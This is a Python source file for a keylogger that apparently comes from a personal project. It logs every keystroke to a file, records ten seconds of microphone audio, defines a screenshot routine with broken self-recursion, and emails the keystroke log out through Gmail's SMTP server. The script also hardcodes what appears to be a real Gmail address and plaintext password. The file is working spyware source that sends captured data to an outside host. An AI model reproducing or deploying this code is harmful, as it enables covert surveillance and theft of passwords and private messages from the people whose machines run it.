from pynput.keyboard import Key, Listener

from scipy.io.wavfile import write
import sounddevice as sd

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from PIL import ImageGrab

keys_information = "key_log"
file_path = "C:\\Users\\bharg\\PycharmProjects\\pythonProject\\Project"
extend = "\\"
screenshot_path = "image.png"
microphone_time = 10
audio_info = "audio.wav"
toadd = "bhargavsriram57@gmail.com"
email_address = "bhargavsriram57@gmail.com"
password = "11071103"



def logging_keystroke(key):
    key=str(key).replace("'","")
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == 'Key.enter':
        key = '\n'


    with open(keys_information, 'a') as b:
        b.write(key)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=logging_keystroke,on_release=on_release) as l:
    l.join()


#Taking screenshots


def screenshots():
    screenshot = ImageGrab.grab()
    screenshot.save(file_path + extend + screenshot_path)


    screenshots()


def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs,channels=2)
    sd.wait()

    write(file_path + extend + audio_info,fs,myrecording)


microphone()


def sendmail(filename, attachment, toadd):
    fromadd = email_address
    msg = MIMEMultipart()

    msg['From'] = fromadd
    msg['To'] = toadd
    msg['Subject'] = "Text File"

    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content', "attachment: filename= %s" % filename)
    msg.attach(p)

    s= smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromadd, password)
    text=msg.as_string()
    s.sendmail(fromadd,toadd,text)
    s.quit()

sendmail(keys_information, file_path + extend + keys_information, toadd)





    










